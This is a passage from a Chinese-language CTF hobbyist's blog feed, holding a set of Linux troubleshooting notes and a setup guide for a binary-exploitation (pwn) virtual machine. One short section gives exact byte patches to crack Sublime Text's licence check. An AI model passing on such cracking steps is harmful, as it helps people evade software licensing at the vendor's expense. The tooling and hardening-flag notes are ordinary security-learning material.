class="hljs-params">(<span class="hljs-number">0</span>C81890h)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function">Base::Function_1:</span><br><span class="hljs-function"><span class="hljs-number">00</span>C813E3 E9 <span class="hljs-number">38</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       jmp         Base::Function_1 (<span class="hljs-number">0</span>C81820h)  </span><br><span class="hljs-function">    </span><br><span class="hljs-function">Base::Function_3:</span><br><span class="hljs-function"><span class="hljs-number">00</span>C813E8 E9 <span class="hljs-number">13</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       jmp         Base::Function_3 (<span class="hljs-number">0</span>C81900h) </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>踩过的坑</title>
    <link href="/2021/11/08/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
    <url>/2021/11/08/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>随缘记录一些日常碰到的问题</p><h2 id="zsh终端出现问题"><a href="#zsh终端出现问题" class="headerlink" title="zsh终端出现问题"></a>zsh终端出现问题</h2><p><strong>zsh: corrupt history file /home/xxx/.zsh_history</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv ~/.zsh_history ~/.zsh_history_bad<br>strings ~/.zsh_history_bad &gt; ~/.zsh_history<br>fc -R ~.zsh_history<br></code></pre></td></tr></table></figure><h2 id="虚拟机挂起后无法联网"><a href="#虚拟机挂起后无法联网" class="headerlink" title="虚拟机挂起后无法联网"></a>虚拟机挂起后无法联网</h2><p><code>sudo service network-manager restart</code></p><h2 id="ubuntu清理垃圾"><a href="#ubuntu清理垃圾" class="headerlink" title="ubuntu清理垃圾"></a>ubuntu清理垃圾</h2><h3 id="查看空间利用率"><a href="#查看空间利用率" class="headerlink" title="查看空间利用率"></a>查看空间利用率</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">df -h<br></code></pre></td></tr></table></figure><h3 id="删除不需要的软件包"><a href="#删除不需要的软件包" class="headerlink" title="删除不需要的软件包"></a>删除不需要的软件包</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get autoremove --purge<br></code></pre></td></tr></table></figure><h3 id="清空垃圾桶"><a href="#清空垃圾桶" class="headerlink" title="清空垃圾桶"></a>清空垃圾桶</h3><h3 id="清理APT缓存"><a href="#清理APT缓存" class="headerlink" title="清理APT缓存"></a>清理APT缓存</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo du -sh /var/cache/apt <span class="hljs-comment">#查看APT缓存的当前利用率</span><br>sudo apt-get autoclean<span class="hljs-comment">#清理过时的deb包</span><br>sudo apt-get clean删除了apt缓存中保存的所有包<br></code></pre></td></tr></table></figure><h2 id="ubuntu16升级python3-8"><a href="#ubuntu16升级python3-8" class="headerlink" title="ubuntu16升级python3.8"></a>ubuntu16升级python3.8</h2><h3 id="添加-deadsnakes-PPA-源安装python3-8"><a href="#添加-deadsnakes-PPA-源安装python3-8" class="headerlink" title="添加 deadsnakes PPA 源安装python3.8"></a>添加 deadsnakes PPA 源安装python3.8</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install software-properties-common<br>sudo add-apt-repository ppa:deadsnakes/ppa<br>sudo apt update<br>sudo apt install python3.8<br></code></pre></td></tr></table></figure><h3 id="配置python3-8为系统默认python3"><a href="#配置python3-8为系统默认python3" class="headerlink" title="配置python3.8为系统默认python3"></a>配置python3.8为系统默认python3</h3><p>可用使用which查看python路径</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">which</span> python3.8<br>/usr/bin/python3.8<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 1<br>sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 2<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo update-alternatives --config python3<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/26/SLWzg1wb35iJUIP.png"></p><h3 id="配置pip3"><a href="#配置pip3" class="headerlink" title="配置pip3"></a>配置pip3</h3><p>升级完python3.8后,我发现pip3没法用了,<a href="https://stackoverflow.com/questions/63823964/importerror-cannot-import-name-sysconfig-from-distutils-usr-lib-python3-8?rq=1">参考</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip3<br><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/verf1sh/.local/bin/pip3&quot;</span>, line 5, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    from pip._internal.cli.main import main<br>  File <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/pip/__init__.py&quot;</span>, line 14, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    from pip.utils import get_installed_distributions, get_prog<br>  File <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/pip/utils/__init__.py&quot;</span>, line 23, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    from pip.locations import (<br>  File <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/pip/locations.py&quot;</span>, line 9, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    from distutils import sysconfig<br>ImportError: cannot import name <span class="hljs-string">&#x27;sysconfig&#x27;</span> from <span class="hljs-string">&#x27;distutils&#x27;</span> (/usr/lib/python3.8/distutils/__init__.py)<br></code></pre></td></tr></table></figure><p>执行下面命令就可以正常使用了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install python3.8-distutils<br></code></pre></td></tr></table></figure><p>若还未成功,可用尝试卸载pip3然后重装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt remove python3-pip<br>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py<br>python3.8 get-pip.py<br></code></pre></td></tr></table></figure><h2 id="VMware虚拟机中ubuntu扩容"><a href="#VMware虚拟机中ubuntu扩容" class="headerlink" title="VMware虚拟机中ubuntu扩容"></a>VMware虚拟机中ubuntu扩容</h2><p>在vmware虚拟机中使用Ubuntu，刚开始分配的硬盘空间用长了时间可能不够用了，下面记录如何扩充容量（ubuntu20.04）。</p><p>首先为了预防操作失误可以先做个备份，然后虚拟机关机。</p><p>在虚拟机设置里面点击拓展，然后重新指定磁盘大小</p><p><img src="https://i.loli.net/2021/11/30/lXWjsBZoUkMrVGq.png"></p><p>分配好空间后还得进入系统手动进行分区，安装分区软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gparted<br>sudo gparted<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/30/hvl1gk6wAJEic3j.png"></p><p>先在extended那里点击右键更改大小</p><p><img src="https://i.loli.net/2021/11/30/JZvXoPfYhiVBqTt.png" alt="image-20211130155607073"></p><p>然后鼠标把这个往右拉到底</p><p><img src="https://i.loli.net/2021/11/30/5ngTopFCV2A9cNr.png"></p><p>接着把sda5那个拉到最右</p><p><img src="https://i.loli.net/2021/11/30/vzKPDFm6LGYh2XZ.png" alt="image-20211130155758754"></p><p>最后点击绿色的勾勾</p><p><img src="https://i.loli.net/2021/11/30/i3OdeuqlAVRY7TH.png" alt="image-20211130155840897"></p><p>OK</p><h2 id="python开启自带http服务"><a href="#python开启自带http服务" class="headerlink" title="python开启自带http服务"></a>python开启自带http服务</h2><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python -m SimpleHTTPServer 8000<br></code></pre></td></tr></table></figure><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python -m http.server 8000<br></code></pre></td></tr></table></figure><h2 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换libc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#先进入lib64目录创建一个软连接</span><br>sudo ln -s /path/to/your/ld.so ./ld-xx.so<br><br><span class="hljs-comment">#再进入题目目录</span><br>patchelf --set-interpreter /lib64/ld-xx.so ./bin    <span class="hljs-comment">#bin是二进制文件名   第一个参数是ld.so的目录 bin是二进制文件</span><br><br>patchelf --replace-needed libc.so.6 /home/verf1sh/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so ./bin <span class="hljs-comment">#libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    bin是二进制文件</span><br><br></code></pre></td></tr></table></figure><h2 id="编译的保护措施"><a href="#编译的保护措施" class="headerlink" title="编译的保护措施"></a>编译的保护措施</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了<br>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息<br>PIE：-fpie -no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk<br>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限<br></code></pre></td></tr></table></figure><h2 id="ubuntu终端光标消失"><a href="#ubuntu终端光标消失" class="headerlink" title="ubuntu终端光标消失"></a>ubuntu终端光标消失</h2><p>显示光标：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;\033[?25h&quot;<br></code></pre></td></tr></table></figure><p>隐藏光标：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;\033[?25l&quot;<br></code></pre></td></tr></table></figure><h2 id="vim设置tab键为4个空格"><a href="#vim设置tab键为4个空格" class="headerlink" title="vim设置tab键为4个空格"></a>vim设置tab键为4个空格</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/vimrc<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> ts=4<br><span class="hljs-built_in">set</span> expandtab<br><span class="hljs-built_in">set</span> autoindent<br></code></pre></td></tr></table></figure><h2 id="sublime破解"><a href="#sublime破解" class="headerlink" title="sublime破解"></a>sublime破解</h2><p>1、打开浏览器进入网站<a href="https://hexed.it/">https://hexed.it</a><br>2、打开<a href="https://so.csdn.net/so/search?q=sublime&spm=1001.2101.3001.7020">sublime</a> text4安装目录选择文件sublime_text.exe<br>3、搜索80 78 05 00 0f 94 c1更改为c6 40 05 01 48 85 c9(第一个匹配到的)<br>4、保存文件命名为sublime_text.exe并替换原文件</p><h2 id="查看mysql语句执行记录"><a href="#查看mysql语句执行记录" class="headerlink" title="查看mysql语句执行记录"></a>查看mysql语句执行记录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看当前配置</span><br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%log_output%&#x27;</span>;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/13/6FCPRASTJeHxtju.png" alt="image-20220313152709855"></p><p><img src="https://s2.loli.net/2022/03/13/NvmqbnoVxaAOJUB.png" alt="image-20220313152853172"></p><p>ON状态表示开启日志模式，日志输出到下面的文件，若为OFF，使用下面命令开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> log_output <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;FILE&#x27;</span>;  <span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;ON&#x27;</span>; <br></code></pre></td></tr></table></figure><h2 id="软链接修改"><a href="#软链接修改" class="headerlink" title="软链接修改"></a>软链接修改</h2><p>例如替换python的软链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -rf /usr/bin/python<br>ln -s /usr/bin/python3 /usr/bin/python<br></code></pre></td></tr></table></figure><h2 id="ubuntu终端自动补全忽略大小写"><a href="#ubuntu终端自动补全忽略大小写" class="headerlink" title="ubuntu终端自动补全忽略大小写"></a>ubuntu终端自动补全忽略大小写</h2><p>Ubuntu自带的bash是大小写敏感的，不好用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim ~/.inputrc<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> match-hidden-files off<br><br><span class="hljs-built_in">set</span> show-all-if-ambiguous on<br><span class="hljs-built_in">set</span> completion-ignore-case on<br><br><span class="hljs-string">&quot;\e[A&quot;</span>: history-search-backward<br><span class="hljs-string">&quot;\e[B&quot;</span>: history-search-forward<br></code></pre></td></tr></table></figure><h2 id="scp拷贝"><a href="#scp拷贝" class="headerlink" title="scp拷贝"></a>scp拷贝</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> s拷贝本地文件到远程服务器</span><br>scp a.txt xxx@192.168.1.1:/home/xxx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn虚拟机配置</title>
    <link href="/2021/11/04/pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/11/04/pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>最近带着师弟师妹入坑二进制，先是环境搭建，以下是详细步骤。</p><h2 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h2><p>新手建议以ubuntu 16.04的虚拟机入门，<a href="https://mirrors.aliyun.com/oldubuntu-releases/releases/16.04.1/ubuntu-16.04.1-server-amd64.iso">https://mirrors.aliyun.com/oldubuntu-releases/releases/16.04.1/ubuntu-16.04.1-server-amd64.iso</a></p><p>迅雷没开会员下载速度也还可以。</p><p><img src="https://i.loli.net/2021/11/04/YhxwVPqoBEXWnF8.png"></p><p>虚拟机下载完成后就可以安装了，我这里使用的是VMware。VMware新建虚拟机就不细说了，网上有很多详细<a href="https://blog.csdn.net/wang_624/article/details/90347274">步骤</a>。</p><h2 id="安装vm-tools"><a href="#安装vm-tools" class="headerlink" title="安装vm-tools"></a>安装vm-tools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install open-vm-tools-desktop fuse<br></code></pre></td></tr></table></figure><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br>deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse<br><span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br>deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse<br><span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br>deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse<br><span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br>deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse<br><span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><br><span class="hljs-comment"># 预发布软件源，不建议启用</span><br><span class="hljs-comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br><span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt update<br></code></pre></td></tr></table></figure><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py<br>sudo python get-pip.py<br>sudo python3 get-pip.py<br></code></pre></td></tr></table></figure><h2 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">mkdir ~/.pip<br>vim ~/.pip/pip.conf<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">[global]<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip2 install pwntools<br></code></pre></td></tr></table></figure><h2 id="gdb插件联合使用"><a href="#gdb插件联合使用" class="headerlink" title="gdb插件联合使用"></a>gdb插件联合使用</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>若虚拟机git下载连接超时就，本机下载然后复制进虚拟机</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install git<br>git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git<br>git <span class="hljs-built_in">clone</span> https://github.com/longld/peda.git<br>git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br></code></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>先安装pwndbg</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ~/pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>执行setup时可能会出现异常，报错如下：<br>/bin/bash^M: bad interpreter: No such file or directory</p><p>这个报错可以使用如下命令进行修复：<code>sed -i -e &#39;s/\r$//&#39; setup.sh</code></p></blockquote><p>再配置下Pwngdb</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ~<br>cp ~/Pwngdb/.gdbinit ~/<br>vim ~/.gdbinit<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#source ~/peda/peda.py</span><br><span class="hljs-built_in">source</span> ~/pwndbg/gdbinit.py<br><span class="hljs-built_in">source</span> ~/Pwngdb/pwngdb.py<br><span class="hljs-built_in">source</span> ~/Pwngdb/angelheap/gdbinit.py<br><br>define hook-run<br>python<br>import angelheap<br>angelheap.init_angelheap()<br>end<br>end<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/05/brPVp985zwTRG6O.png"></p><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install --reinstall ca-certificates<br>sudo add-apt-repository ppa:brightbox/ruby-ng<br>sudo apt-get update<br>sudo apt-get install ruby2.6 ruby2.6-dev<br>sudo apt-get install gem -y<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure><h2 id="安装32位库"><a href="#安装32位库" class="headerlink" title="安装32位库"></a>安装32位库</h2><p>不安装这个的话，32位的程序运行可能出问题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install lib32ncurses5<br>sudo apt-get install lib32z1<br></code></pre></td></tr></table></figure><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><p>附带两个在线查询libc版本的网站：</p><p><a href="https://libc.nullbyte.cat/">libc database search</a></p><p><a href="https://libc.blukat.me/">异构libc database search</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip install LibcSearcher<br></code></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><p>查看程序沙箱规则</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo gem install seccomp-tools<br></code></pre></td></tr></table></figure><p>用法: <code>seccomp-tools dump ./bin</code></p><h2 id="安装zsh和oh-my-zsh"><a href="#安装zsh和oh-my-zsh" class="headerlink" title="安装zsh和oh-my-zsh"></a>安装zsh和oh-my-zsh</h2><h3 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install zsh<br>chsh -s /bin/zsh<br>sudo vim /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/05/LneMPVjkDOUEY6B.png"></p><h3 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="安装autojump自动跳转插件"><a href="#安装autojump自动跳转插件" class="headerlink" title="安装autojump自动跳转插件"></a>安装autojump自动跳转插件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install autojump<br>vim ~/.zshrc<br><span class="hljs-comment"># 在最后一行加入，注意点后面是一个空格</span><br>. /usr/share/autojump/autojump.sh<br><span class="hljs-comment"># 生效</span><br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><h3 id="安装zsh-syntax-highlighting语法高亮插件"><a href="#安装zsh-syntax-highlighting语法高亮插件" class="headerlink" title="安装zsh-syntax-highlighting语法高亮插件"></a>安装zsh-syntax-highlighting语法高亮插件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<br>git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source <span class="hljs-variable">$&#123;(q-)PWD&#125;</span>/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot;</span> &gt;&gt; <span class="hljs-variable">$&#123;ZDOTDIR:-<span class="hljs-variable">$HOME</span>&#125;</span>/.zshrc<br><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><h2 id="安装sublime"><a href="#安装sublime" class="headerlink" title="安装sublime"></a>安装sublime</h2><p>最后<del>安装个sublime</del>(安装失败)写exp吧，vscode其实也可以。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo add-apt-repository ppa:webupd8team/sublime-text-3<br>sudo apt-get update<br>sudo apt-get install sublime-text-installer<br></code></pre></td></tr></table></figure><p>vscode安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install software-properties-common apt-transport-https<br>wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main&quot;</span><br>sudo apt update<br>sudo apt install code<br></code></pre></td></tr></table></figure><blockquote><p>大功告成，初步就这样了，以后需要什么就下载什么</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_kernel_pwn初探</title>
    <link href="/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/"/>
    <url>/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/</url>
    
